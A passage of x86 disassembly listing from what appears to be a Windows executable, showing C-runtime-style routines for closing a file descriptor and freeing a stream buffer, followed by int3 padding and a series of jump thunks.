  40ea20:	83 c4 04             	add    $0x4,%esp
  40ea23:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ea26:	8b e5                	mov    %ebp,%esp
  40ea28:	5d                   	pop    %ebp
  40ea29:	c3                   	ret
  40ea2a:	cc                   	int3
  40ea2b:	cc                   	int3
  40ea2c:	cc                   	int3
  40ea2d:	cc                   	int3
  40ea2e:	cc                   	int3
  40ea2f:	cc                   	int3
  40ea30:	55                   	push   %ebp
  40ea31:	8b ec                	mov    %esp,%ebp
  40ea33:	51                   	push   %ecx
  40ea34:	56                   	push   %esi
  40ea35:	8b 45 08             	mov    0x8(%ebp),%eax
  40ea38:	50                   	push   %eax
  40ea39:	e8 72 f5 ff ff       	call   0x40dfb0
  40ea3e:	83 c4 04             	add    $0x4,%esp
  40ea41:	83 f8 ff             	cmp    $0xffffffff,%eax
  40ea44:	74 3d                	je     0x40ea83
  40ea46:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40ea4a:	74 06                	je     0x40ea52
  40ea4c:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40ea50:	75 1a                	jne    0x40ea6c
  40ea52:	6a 01                	push   $0x1
  40ea54:	e8 57 f5 ff ff       	call   0x40dfb0
  40ea59:	83 c4 04             	add    $0x4,%esp
  40ea5c:	8b f0                	mov    %eax,%esi
  40ea5e:	6a 02                	push   $0x2
  40ea60:	e8 4b f5 ff ff       	call   0x40dfb0
  40ea65:	83 c4 04             	add    $0x4,%esp
  40ea68:	3b f0                	cmp    %eax,%esi
  40ea6a:	74 17                	je     0x40ea83
  40ea6c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ea6f:	51                   	push   %ecx
  40ea70:	e8 3b f5 ff ff       	call   0x40dfb0
  40ea75:	83 c4 04             	add    $0x4,%esp
  40ea78:	50                   	push   %eax
  40ea79:	ff 15 f8 f0 40 00    	call   *0x40f0f8
  40ea7f:	85 c0                	test   %eax,%eax
  40ea81:	74 09                	je     0x40ea8c
  40ea83:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40ea8a:	eb 09                	jmp    0x40ea95
  40ea8c:	ff 15 58 f0 40 00    	call   *0x40f058
  40ea92:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ea95:	8b 55 08             	mov    0x8(%ebp),%edx
  40ea98:	52                   	push   %edx
  40ea99:	e8 32 f4 ff ff       	call   0x40ded0
  40ea9e:	83 c4 04             	add    $0x4,%esp
  40eaa1:	8b 45 08             	mov    0x8(%ebp),%eax
  40eaa4:	c1 f8 05             	sar    $0x5,%eax
  40eaa7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40eaaa:	83 e1 1f             	and    $0x1f,%ecx
  40eaad:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40eab0:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40eab7:	c6 44 0a 04 00       	movb   $0x0,0x4(%edx,%ecx,1)
  40eabc:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40eac0:	74 11                	je     0x40ead3
  40eac2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40eac5:	50                   	push   %eax
  40eac6:	e8 95 d5 ff ff       	call   0x40c060
  40eacb:	83 c4 04             	add    $0x4,%esp
  40eace:	83 c8 ff             	or     $0xffffffff,%eax
  40ead1:	eb 02                	jmp    0x40ead5
  40ead3:	33 c0                	xor    %eax,%eax
  40ead5:	5e                   	pop    %esi
  40ead6:	8b e5                	mov    %ebp,%esp
  40ead8:	5d                   	pop    %ebp
  40ead9:	c3                   	ret
  40eada:	cc                   	int3
  40eadb:	cc                   	int3
  40eadc:	cc                   	int3
  40eadd:	cc                   	int3
  40eade:	cc                   	int3
  40eadf:	cc                   	int3
  40eae0:	55                   	push   %ebp
  40eae1:	8b ec                	mov    %esp,%ebp
  40eae3:	53                   	push   %ebx
  40eae4:	56                   	push   %esi
  40eae5:	57                   	push   %edi
  40eae6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40eaea:	75 1e                	jne    0x40eb0a
  40eaec:	68 a0 ff 40 00       	push   $0x40ffa0
  40eaf1:	6a 00                	push   $0x0
  40eaf3:	6a 30                	push   $0x30
  40eaf5:	68 f0 ff 40 00       	push   $0x40fff0
  40eafa:	6a 02                	push   $0x2
  40eafc:	e8 bf aa ff ff       	call   0x4095c0
  40eb01:	83 c4 14             	add    $0x14,%esp
  40eb04:	83 f8 01             	cmp    $0x1,%eax
  40eb07:	75 01                	jne    0x40eb0a
  40eb09:	cc                   	int3
  40eb0a:	33 c0                	xor    %eax,%eax
  40eb0c:	85 c0                	test   %eax,%eax
  40eb0e:	75 d6                	jne    0x40eae6
  40eb10:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40eb13:	8b 51 0c             	mov    0xc(%ecx),%edx
  40eb16:	81 e2 83 00 00 00    	and    $0x83,%edx
  40eb1c:	85 d2                	test   %edx,%edx
  40eb1e:	74 4d                	je     0x40eb6d
  40eb20:	8b 45 08             	mov    0x8(%ebp),%eax
  40eb23:	8b 48 0c             	mov    0xc(%eax),%ecx
  40eb26:	83 e1 08             	and    $0x8,%ecx
  40eb29:	85 c9                	test   %ecx,%ecx
  40eb2b:	74 40                	je     0x40eb6d
  40eb2d:	6a 02                	push   $0x2
  40eb2f:	8b 55 08             	mov    0x8(%ebp),%edx
  40eb32:	8b 42 08             	mov    0x8(%edx),%eax
  40eb35:	50                   	push   %eax
  40eb36:	e8 f5 76 ff ff       	call   0x406230
  40eb3b:	83 c4 08             	add    $0x8,%esp
  40eb3e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40eb41:	8b 51 0c             	mov    0xc(%ecx),%edx
  40eb44:	81 e2 f7 fb ff ff    	and    $0xfffffbf7,%edx
  40eb4a:	8b 45 08             	mov    0x8(%ebp),%eax
  40eb4d:	89 50 0c             	mov    %edx,0xc(%eax)
  40eb50:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40eb53:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  40eb59:	8b 55 08             	mov    0x8(%ebp),%edx
  40eb5c:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  40eb63:	8b 45 08             	mov    0x8(%ebp),%eax
  40eb66:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40eb6d:	5f                   	pop    %edi
  40eb6e:	5e                   	pop    %esi
  40eb6f:	5b                   	pop    %ebx
  40eb70:	5d                   	pop    %ebp
  40eb71:	c3                   	ret
  40eb72:	ff 25 14 f0 40 00    	jmp    *0x40f014
  40eb78:	cc                   	int3
  40eb79:	cc                   	int3
  40eb7a:	cc                   	int3
  40eb7b:	cc                   	int3
  40eb7c:	cc                   	int3
  40eb7d:	cc                   	int3
  40eb7e:	cc                   	int3
  40eb7f:	cc                   	int3
  40eb80:	b8 80 00 41 00       	mov    $0x410080,%eax
  40eb85:	e9 16 3f ff ff       	jmp    0x402aa0
  40eb8a:	b8 d8 00 41 00       	mov    $0x4100d8,%eax
  40eb8f:	e9 0c 3f ff ff       	jmp    0x402aa0
  40eb94:	b8 30 01 41 00       	mov    $0x410130,%eax
  40eb99:	e9 02 3f ff ff       	jmp    0x402aa0
  40eb9e:	b8 88 01 41 00       	mov    $0x410188,%eax
  40eba3:	e9 f8 3e ff ff       	jmp    0x402aa0
  40eba8:	b8 e0 01 41 00       	mov    $0x4101e0,%eax
  40ebad:	e9 ee 3e ff ff       	jmp    0x402aa0
  40ebb2:	b8 68 02 41 00       	mov    $0x410268,%eax
  40ebb7:	e9 e4 3e ff ff       	jmp    0x402aa0
  40ebbc:	b8 c0 02 41 00       	mov    $0x4102c0,%eax
  40ebc1:	e9 da 3e ff ff       	jmp    0x402aa0
  40ebc6:	b8 18 03 41 00       	mov    $0x410318,%eax
  40ebcb:	e9 d0 3e ff ff       	jmp    0x402aa0
  40ebd0:	b8 a0 03 41 00       	mov    $0x4103a0,%eax
  40ebd5:	e9 c6 3e ff ff       	jmp    0x402aa0
  40ebda:	b8 f8 03 41 00       	mov    $0x4103f8,%eax
  40ebdf:	e9 bc 3e ff ff       	jmp    0x402aa0
  40ebe4:	b8 50 04 41 00       	mov    $0x410450,%eax
  40ebe9:	e9 b2 3e ff ff       	jmp    0x402aa0
